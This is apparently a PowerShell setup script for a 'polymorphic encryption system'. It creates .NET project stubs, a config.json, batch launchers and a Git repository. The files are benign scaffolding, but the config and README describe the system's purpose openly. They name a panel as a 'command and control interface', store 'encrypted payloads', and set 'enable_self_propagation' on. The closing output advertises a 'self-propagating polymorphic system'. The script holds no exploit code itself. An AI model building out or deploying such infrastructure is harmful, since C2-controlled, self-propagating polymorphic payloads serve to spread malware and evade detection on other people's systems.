<#
.SYNOPSIS
  Setup Ocean Digital integration and Git storage for the polymorphic system
.DESCRIPTION
  This script configures the system to work with Ocean Digital platform and Git storage
#>

param(
    [string]$OceanApiKey,
    [string]$OceanAppId = "polymorphic_encryption",
    [string]$PanelUrl,
    [string]$PanelToken,
    [string]$GitRemoteUrl,
    [string]$GitBranch = "main"
)

Write-Host "=== Setting up Ocean Digital Integration ===" -ForegroundColor Cyan

# Create project files for all components
$projects = @(
    @{ Name = "PanelIntegration"; Path = "PanelIntegration" },
    @{ Name = "OceanDigital"; Path = "OceanDigital" },
    @{ Name = "GitStorage"; Path = "GitStorage" },
    @{ Name = "CrossHotPatcher"; Path = "CrossHotPatcher" },
    @{ Name = "AssemblyGenerators"; Path = "AssemblyGenerators" },
    @{ Name = "IntegratedSystem"; Path = "IntegratedSystem" }
)

foreach ($project in $projects) {
    $projectPath = Join-Path $PSScriptRoot $project.Path
    if (-not (Test-Path $projectPath)) {
        New-Item -Path $projectPath -ItemType Directory -Force | Out-Null
    }
    
    $csprojPath = Join-Path $projectPath "$($project.Name).csproj"
    if (-not (Test-Path $csprojPath)) {
        $csprojContent = @"
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <Nullable>enable</Nullable>
    <ImplicitUsings>enable</ImplicitUsings>
  </PropertyGroup>

</Project>
"@
        Set-Content -Path $csprojPath -Value $csprojContent -Encoding UTF8
        Write-Host "✓ Created project: $($project.Name)" -ForegroundColor Green
    }
}

# Update configuration
$configPath = Join-Path $PSScriptRoot "config.json"
$config = @{
    panel_url = $PanelUrl ?? "http://localhost:8080"
    panel_token = $PanelToken
    ocean_url = "https://api.oceandigital.com"
    ocean_api_key = $OceanApiKey ?? "your_api_key_here"
    ocean_app_id = $OceanAppId
    git_repo_path = "./polymorphic_repo"
    git_remote_url = $GitRemoteUrl
    git_branch = $GitBranch
    cross_hot_patch_interval = 60
    max_generators = 4
    assembly_instruction_range = @(50, 300)
    patch_size_limit = 64
    enable_self_propagation = $true
    enable_ocean_upload = $true
    enable_git_storage = $true
    enable_panel_integration = $true
} | ConvertTo-Json -Depth 3

Set-Content -Path $configPath -Value $config -Encoding UTF8
Write-Host "✓ Updated configuration" -ForegroundColor Green

# Create environment setup script
$envScript = @"
@echo off
echo Setting up environment variables for Ocean Digital integration...

set PANEL_URL=$PanelUrl
set PANEL_TOKEN=$PanelToken
set OCEAN_URL=https://api.oceandigital.com
set OCEAN_API_KEY=$OceanApiKey
set OCEAN_APP_ID=$OceanAppId
set GIT_REPO_PATH=./polymorphic_repo
set GIT_REMOTE_URL=$GitRemoteUrl
set GIT_BRANCH=$GitBranch

echo Environment variables set!
echo.
echo To start the integrated system:
echo   dotnet run --project IntegratedSystem
echo.
pause
"@

$envScriptPath = Join-Path $PSScriptRoot "Setup-Environment.bat"
Set-Content -Path $envScriptPath -Value $envScript -Encoding ASCII
Write-Host "✓ Created environment setup script" -ForegroundColor Green

# Create startup script
$startScript = @"
@echo off
echo Starting Integrated Polymorphic System with Ocean Digital...
echo.

REM Load environment variables
call Setup-Environment.bat

REM Build all projects
echo Building projects...
dotnet build --configuration Release

REM Start the integrated system
echo Starting integrated system...
dotnet run --project IntegratedSystem

pause
"@

$startScriptPath = Join-Path $PSScriptRoot "Start-IntegratedSystem.bat"
Set-Content -Path $startScriptPath -Value $startScript -Encoding ASCII
Write-Host "✓ Created startup script" -ForegroundColor Green

# Create Git repository if specified
if ($GitRemoteUrl) {
    $repoPath = Join-Path $PSScriptRoot "polymorphic_repo"
    if (-not (Test-Path $repoPath)) {
        New-Item -Path $repoPath -ItemType Directory -Force | Out-Null
        Set-Location $repoPath
        
        git init
        git remote add origin $GitRemoteUrl
        git branch -M $GitBranch
        
        # Create initial README
        $readme = @"
# Polymorphic Encryption Repository

This repository contains encrypted payloads, assembly code, and hot patches generated by the polymorphic encryption system.

## Structure

- `payloads/` - Encrypted payloads with metadata
- `assembly/` - Generated assembly code
- `patches/` - Hot patches for cross-generator patching
- `logs/` - System logs and status information

## Integration

- **Ocean Digital**: Cloud storage and API integration
- **Panel**: Command and control interface
- **Cross-Hot-Patching**: Self-propagating assembly generators

Generated by Polymorphic Encryption System v1.0
"@
        Set-Content -Path "README.md" -Value $readme -Encoding UTF8
        git add README.md
        git commit -m "Initial commit - Polymorphic Encryption Repository"
        
        Set-Location $PSScriptRoot
        Write-Host "✓ Initialized Git repository" -ForegroundColor Green
    }
}

Write-Host "`n=== Ocean Digital Integration Setup Complete! ===" -ForegroundColor Green
Write-Host "`nNext steps:" -ForegroundColor Yellow
Write-Host "1. Update config.json with your actual API keys and URLs" -ForegroundColor White
Write-Host "2. Run 'Start-IntegratedSystem.bat' to start the system" -ForegroundColor White
Write-Host "3. The system will automatically:" -ForegroundColor White
Write-Host "   - Connect to Ocean Digital for cloud storage" -ForegroundColor White
Write-Host "   - Connect to your panel for commands" -ForegroundColor White
Write-Host "   - Use Git for version control and storage" -ForegroundColor White
Write-Host "   - Start cross-hot-patching between assembly generators" -ForegroundColor White
Write-Host "`nFeatures:" -ForegroundColor Cyan
Write-Host "✓ Ocean Digital cloud integration" -ForegroundColor Green
Write-Host "✓ Panel command and control" -ForegroundColor Green
Write-Host "✓ Git storage and versioning" -ForegroundColor Green
Write-Host "✓ Cross-hot-patching assembly generators" -ForegroundColor Green
Write-Host "✓ Self-propagating polymorphic system" -ForegroundColor Green